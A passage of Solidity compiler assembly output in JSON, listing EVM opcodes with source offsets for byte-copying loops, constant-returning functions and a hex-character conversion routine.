											"begin": 12776,
											"end": 12779,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 12776,
											"end": 12779,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 12776,
											"end": 12779,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "160"
										},
										{
											"begin": 12776,
											"end": 12779,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12776,
											"end": 12779,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "118"
										},
										{
											"begin": 12776,
											"end": 12779,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12776,
											"end": 12779,
											"name": "tag",
											"source": 0,
											"value": "160"
										},
										{
											"begin": 12776,
											"end": 12779,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12776,
											"end": 12779,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 12776,
											"end": 12779,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "161"
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "162"
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "79"
										},
										{
											"begin": 12766,
											"end": 12780,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "tag",
											"source": 0,
											"value": "162"
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "tag",
											"source": 0,
											"value": "161"
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12780,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12796,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12796,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 12766,
											"end": 12796,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12796,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12796,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12796,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12796,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 12766,
											"end": 12796,
											"name": "BYTE",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12796,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12796,
											"name": "MSTORE8",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12796,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12746,
											"end": 12749,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12746,
											"end": 12749,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 12746,
											"end": 12749,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "163"
										},
										{
											"begin": 12746,
											"end": 12749,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12746,
											"end": 12749,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "118"
										},
										{
											"begin": 12746,
											"end": 12749,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12746,
											"end": 12749,
											"name": "tag",
											"source": 0,
											"value": "163"
										},
										{
											"begin": 12746,
											"end": 12749,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12746,
											"end": 12749,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 12746,
											"end": 12749,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12746,
											"end": 12749,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12716,
											"end": 12808,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "155"
										},
										{
											"begin": 12716,
											"end": 12808,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12716,
											"end": 12808,
											"name": "tag",
											"source": 0,
											"value": "156"
										},
										{
											"begin": 12716,
											"end": 12808,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12826,
											"end": 12827,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 12824,
											"end": 12827,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 12824,
											"end": 12827,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12820,
											"end": 12914,
											"name": "tag",
											"source": 0,
											"value": "164"
										},
										{
											"begin": 12820,
											"end": 12914,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12831,
											"end": 12842,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 12831,
											"end": 12849,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 12829,
											"end": 12830,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 12829,
											"end": 12849,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 12820,
											"end": 12914,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 12820,
											"end": 12914,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "165"
										},
										{
											"begin": 12820,
											"end": 12914,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12899,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 12900,
											"end": 12901,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "167"
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "168"
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "79"
										},
										{
											"begin": 12888,
											"end": 12902,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "tag",
											"source": 0,
											"value": "168"
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "tag",
											"source": 0,
											"value": "167"
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 12888,
											"end": 12902,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12880,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 12881,
											"end": 12884,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 12881,
											"end": 12884,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 12881,
											"end": 12884,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "169"
										},
										{
											"begin": 12881,
											"end": 12884,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12881,
											"end": 12884,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "118"
										},
										{
											"begin": 12881,
											"end": 12884,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12881,
											"end": 12884,
											"name": "tag",
											"source": 0,
											"value": "169"
										},
										{
											"begin": 12881,
											"end": 12884,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12881,
											"end": 12884,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 12881,
											"end": 12884,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "170"
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "171"
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "79"
										},
										{
											"begin": 12871,
											"end": 12885,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "tag",
											"source": 0,
											"value": "171"
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "tag",
											"source": 0,
											"value": "170"
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12885,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12902,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12902,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 12871,
											"end": 12902,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12902,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12902,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12902,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12902,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 12871,
											"end": 12902,
											"name": "BYTE",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12902,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12902,
											"name": "MSTORE8",
											"source": 0
										},
										{
											"begin": 12871,
											"end": 12902,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12851,
											"end": 12854,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12851,
											"end": 12854,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 12851,
											"end": 12854,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "172"
										},
										{
											"begin": 12851,
											"end": 12854,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12851,
											"end": 12854,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "118"
										},
										{
											"begin": 12851,
											"end": 12854,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12851,
											"end": 12854,
											"name": "tag",
											"source": 0,
											"value": "172"
										},
										{
											"begin": 12851,
											"end": 12854,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12851,
											"end": 12854,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 12851,
											"end": 12854,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12851,
											"end": 12854,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12820,
											"end": 12914,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "164"
										},
										{
											"begin": 12820,
											"end": 12914,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12820,
											"end": 12914,
											"name": "tag",
											"source": 0,
											"value": "165"
										},
										{
											"begin": 12820,
											"end": 12914,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12940,
											"end": 12949,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 12926,
											"end": 12950,
											"name": "SWAP7",
											"source": 0
										},
										{
											"begin": 12926,
											"end": 12950,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12926,
											"end": 12950,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12926,
											"end": 12950,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12926,
											"end": 12950,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12926,
											"end": 12950,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12926,
											"end": 12950,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12926,
											"end": 12950,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12328,
											"end": 12958,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 12328,
											"end": 12958,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 12328,
											"end": 12958,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12328,
											"end": 12958,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12328,
											"end": 12958,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6658,
											"end": 6747,
											"name": "tag",
											"source": 0,
											"value": "51"
										},
										{
											"begin": 6658,
											"end": 6747,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6709,
											"end": 6713,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6733,
											"end": 6739,
											"name": "PUSH",
											"source": 0,
											"value": "4958A"
										},
										{
											"begin": 6726,
											"end": 6739,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6726,
											"end": 6739,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6658,
											"end": 6747,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6658,
											"end": 6747,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 7030,
											"end": 7119,
											"name": "tag",
											"source": 0,
											"value": "53"
										},
										{
											"begin": 7030,
											"end": 7119,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 7081,
											"end": 7085,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 7105,
											"end": 7111,
											"name": "PUSH",
											"source": 0,
											"value": "EF2E4"
										},
										{
											"begin": 7098,
											"end": 7111,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7098,
											"end": 7111,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7030,
											"end": 7119,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7030,
											"end": 7119,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12057,
											"end": 12145,
											"name": "tag",
											"source": 0,
											"value": "55"
										},
										{
											"begin": 12057,
											"end": 12145,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12107,
											"end": 12111,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 12131,
											"end": 12137,
											"name": "PUSH",
											"source": 0,
											"value": "EBE5B"
										},
										{
											"begin": 12124,
											"end": 12137,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12124,
											"end": 12137,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12057,
											"end": 12145,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12057,
											"end": 12145,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8676,
											"end": 9013,
											"name": "tag",
											"source": 0,
											"value": "131"
										},
										{
											"begin": 8676,
											"end": 9013,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8734,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8756,
											"end": 8757,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8751,
											"end": 8757,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 8751,
											"end": 8757,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8751,
											"end": 8752,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8751,
											"end": 8757,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 8751,
											"end": 8757,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8751,
											"end": 8767,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8751,
											"end": 8767,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8751,
											"end": 8767,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "177"
										},
										{
											"begin": 8751,
											"end": 8767,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8751,
											"end": 8767,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8766,
											"end": 8767,
											"name": "PUSH",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 8761,
											"end": 8762,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8761,
											"end": 8767,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 8761,
											"end": 8767,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8761,
											"end": 8767,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 8761,
											"end": 8767,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8751,
											"end": 8767,
											"name": "tag",
											"source": 0,
											"value": "177"
										},
										{
											"begin": 8751,
											"end": 8767,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8747,
											"end": 8946,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8747,
											"end": 8946,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "178"
										},
										{
											"begin": 8747,
											"end": 8946,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8819,
											"end": 8820,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8804,
											"end": 8815,
											"name": "PUSH",
											"source": 0,
											"value": "3000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 8798,
											"end": 8816,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8798,
											"end": 8816,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 8798,
											"end": 8820,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "179"
										},
										{
											"begin": 8798,
											"end": 8820,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8798,
											"end": 8820,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8798,
											"end": 8820,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "180"
										},
										{
											"begin": 8798,
											"end": 8820,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8798,
											"end": 8820,
											"name": "tag",
											"source": 0,
											"value": "179"
										},
										{
											"begin": 8798,
											"end": 8820,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8791,
											"end": 8821,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8791,
											"end": 8821,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 8784,
											"end": 8821,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8784,
											"end": 8821,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8784,
											"end": 8821,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "176"
										},
										{
											"begin": 8784,
											"end": 8821,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8747,
											"end": 8946,
											"name": "tag",
											"source": 0,
											"value": "178"
										},
										{
											"begin": 8747,
											"end": 8946,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8855,
											"end": 8856,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8843,
											"end": 8857,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 8843,
											"end": 8857,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8843,
											"end": 8845,
											"name": "PUSH",
											"source": 0,
											"value": "A"
										},
										{
											"begin": 8843,
											"end": 8857,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 8843,
											"end": 8857,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8843,
											"end": 8875,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8843,
											"end": 8875,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8843,
											"end": 8875,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "182"
										},
										{
											"begin": 8843,
											"end": 8875,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8843,
											"end": 8875,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8873,
											"end": 8875,
											"name": "PUSH",
											"source": 0,
											"value": "F"
										},
										{
											"begin": 8867,
											"end": 8868,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8861,
											"end": 8875,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 8861,
											"end": 8875,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8861,
											"end": 8875,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 8861,
											"end": 8875,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8843,
											"end": 8875,
											"name": "tag",
											"source": 0,
											"value": "182"
										},
										{
											"begin": 8843,
											"end": 8875,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8839,
											"end": 8946,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8839,
											"end": 8946,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "183"
										},
										{
											"begin": 8839,
											"end": 8946,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8931,
											"end": 8933,
											"name": "PUSH",
											"source": 0,
											"value": "A"
										},
										{
											"begin": 8927,
											"end": 8928,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8912,
											"end": 8923,
											"name": "PUSH",
											"source": 0,
											"value": "6100000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 8906,
											"end": 8924,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8906,
											"end": 8924,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 8906,
											"end": 8928,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "184"
										},
										{
											"begin": 8906,
											"end": 8928,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8906,
											"end": 8928,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8906,
											"end": 8928,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "180"
										},
										{
											"begin": 8906,
											"end": 8928,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8906,
											"end": 8928,
											"name": "tag",
											"source": 0,
											"value": "184"
										},
										{
											"begin": 8906,
											"end": 8928,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8906,
											"end": 8933,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "185"
										},
										{
											"begin": 8906,
											"end": 8933,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8906,
											"end": 8933,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8906,
											"end": 8933,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "186"
										},
										{
											"begin": 8906,
											"end": 8933,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8906,
											"end": 8933,
											"name": "tag",
											"source": 0,
											"value": "185"
										},
										{
											"begin": 8906,
											"end": 8933,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8899,
											"end": 8934,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8899,
											"end": 8934,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 8892,
											"end": 8934,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8892,
											"end": 8934,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8892,
											"end": 8934,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "176"
										},
										{
											"begin": 8892,
											"end": 8934,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8839,
											"end": 8946,
											"name": "tag",
											"source": 0,
											"value": "183"
										},
										{
											"begin": 8839,
											"end": 8946,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8997,
											"end": 9005,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8997,
											"end": 9005,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8997,
											"end": 9005,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 8676,
											"end": 9013,
											"name": "tag",
											"source": 0,
											"value": "176"
										},
										{
											"begin": 8676,
											"end": 9013,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8676,
											"end": 9013,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8676,
											"end": 9013,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8676,
											"end": 9013,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8676,
											"end": 9013,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 7,
											"end": 106,
											"name": "tag",
											"source": 10,
											"value": "187"
										},
										{
											"begin": 7,
											"end": 106,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 59,
											"end": 65,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 93,
											"end": 98,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 87,
											"end": 99,
											"name": "MLOAD",
											"source": 10
										},
										{
											"begin": 77,
											"end": 99,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 77,
											"end": 99,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 7,
											"end": 106,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 7,
											"end": 106,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 7,
											"end": 106,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 7,
											"end": 106,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 112,
											"end": 281,
											"name": "tag",
											"source": 10,
											"value": "188"
										},
										{
											"begin": 112,
											"end": 281,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 196,
											"end": 207,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 230,
											"end": 236,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 225,
											"end": 228,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 218,
											"end": 237,
											"name": "MSTORE",
											"source": 10
										},
										{
											"begin": 270,
											"end": 274,
											"name": "PUSH",
											"source": 10,
											"value": "20"
										},
										{
											"begin": 265,
											"end": 268,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 261,
											"end": 275,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 246,
											"end": 275,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 246,
											"end": 275,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 112,
											"end": 281,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 112,
											"end": 281,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 112,
											"end": 281,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 112,
											"end": 281,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 112,
											"end": 281,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 287,
											"end": 533,
											"name": "tag",
											"source": 10,
											"value": "189"
										},
										{
											"begin": 287,
											"end": 533,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 368,
											"end": 369,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 378,
											"end": 491,
											"name": "tag",
											"source": 10,
											"value": "201"
										},
										{
											"begin": 378,
											"end": 491,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 392,
											"end": 398,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 389,
											"end": 390,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 386,
											"end": 399,
											"name": "LT",
											"source": 10
										},
										{
											"begin": 378,
											"end": 491,
											"name": "ISZERO",
											"source": 10
										},
										{
											"begin": 378,
											"end": 491,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "203"
										},
										{
											"begin": 378,
											"end": 491,
